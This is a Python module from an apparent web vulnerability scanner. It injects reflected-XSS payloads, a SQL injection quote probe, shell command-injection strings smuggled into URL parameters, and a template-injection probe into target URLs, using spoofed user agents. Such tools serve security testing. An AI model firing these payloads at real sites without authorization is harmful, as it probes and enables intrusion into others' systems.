import requests,time,sys,os,re,random
from .encoder import urlencoder
from .colors import *
from .config import *
errors = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'unkown' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found','internal server':'The page cannot be displayed because an internal server error has occurred.','Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}
def uagent():
	agents=['Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3','Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7','Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1']
	return random.choice(agents).encode('utf-8')
uagent = uagent()

class from_url_get:
	def __init__(slef):
		pass
	def xss(slef,url,co):
		if '*' in url:
			print (end)
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			for payload in payloads:
				payload2=urlencoder(payload)
				if co:
					r=requests.get(url.replace('*',payload2),headers={'User-agent':uagent},cookies=co,verify=vert)
				else:
					r=requests.get(url.replace('*',payload2),headers={'User-agent':uagent},verify=vert)
				if payload.encode('utf-8') in r.content:
					j=url.replace('*',payload2)
					print(f"""

{good} Bug Found : XSS Reflected
{yellow}{end} Payload : {payload}
{yellow}{end} Exploit : {j}
				""")
					break
		elif '*' not in url:
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			for params in url.split("?")[1].split("&"):
				for payload in payloads:
					payload2=urlencoder(payload)
					if co:
						r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent},cookies=co,verify=vert)
					else:
						r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent},verify=vert)
					if payload.encode('utf-8') in r.content:
						j=url.replace(params, params + str(payload2).strip())
						print(f"""

{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Param : {params}
{info}{bold} Exploit : {j}
				""")
						break
	def sqli(self,url,co):
		if '*' in url:
			payloads=['"']
			for f,i in errors.items():
				for payload in payloads:
						if co:
							r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent},cookies=co,verify=vert)
						else:
							r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent},verify=vert)
							ch=re.findall(i.encode('utf-8'),r.content)
							if len(ch) > 0:
								j=url.replace('*',payload.strip())
								print(f"""

{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload : "
{info}{bold} Exploit : {j}
                                """)
								break
		elif '*' not in url:
			for params in url.split("?")[1].split("&"):
				payloads=['"']
				for d,i in errors.items():
					for payload in payloads:
						if co:
							r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent},cookies=co,verify=vert)
						else:
							r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent},verify=vert)
						ch=re.findall(i.encode('utf-8'),r.content)
						if len(ch) > 0:
							j=url.replace(params, params + str(payload).strip())
							print(f"""

{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload : "
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}
				""")
						break
	def osinj(self,url,co):
		if '*' in url:
			payloads=["; echo 'Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print m" ;''']
			for payload in payloads:
				payload2=urlencoder(payload)
				if co:
					r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent},cookies=co,verify=vert)
				else:
					r=requests.get(url.replace('*',str(payload2).strip()),headers={'User-agent':uagent},verify=vert)
				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
					j=url.replace('*',payload2.strip())
					print (f"""

{bold}{good}{bold} Bug Found : Command Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Exploit : {j}
				""")
					break
		for params in url.split("?")[1].split("&"):
			payloads=["; echo 'Command Injection (ScanT3r)' | base64 ;",'''; python -c "import base64 as b ;m=b.b64encode('Command Injection || ScanT3r') ; print m" ;''']
			for payload in payloads:
				payload2=urlencoder(payload)
				if co:
					r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent},cookies=co,verify=vert)
				else:
					r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent},verify=vert)
				if 'Q29tbWFuZCBJbmplY3Rpb24gfHwgU2NhblQzcg=='.encode('utf-8') in r.content or 'Q29tbWFuZCBJbmplY3Rpb24gKFNjYW5UM3IpCg=='.encode('utf-8') in r.content:
					j=url.replace(params, params + str(payload2).strip())
					print (f"""

{bold}{good}{bold} Bug Found : Command Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}
				""")
					break
	def ssti(self,url,co):
		for params in url.split("?")[1].split("&"):
			payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}']
			for payload in payloads:
				payload2=urlencoder(payload)
				if co:
					r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent},cookies=co,verify=vert)
				else:
					r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent},verify=vert)
				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
					j=url.replace(params, params + str(payload2).strip())
					print (f"""

{bold}{good}{bold} Bug Found : Template Injection
{bold}{yellow}{bold} Payload : {payload}
{bold}{yellow}{bold} Param : {params}
{bold}{yellow}{bold} Exploit : {j}
				""")
					break
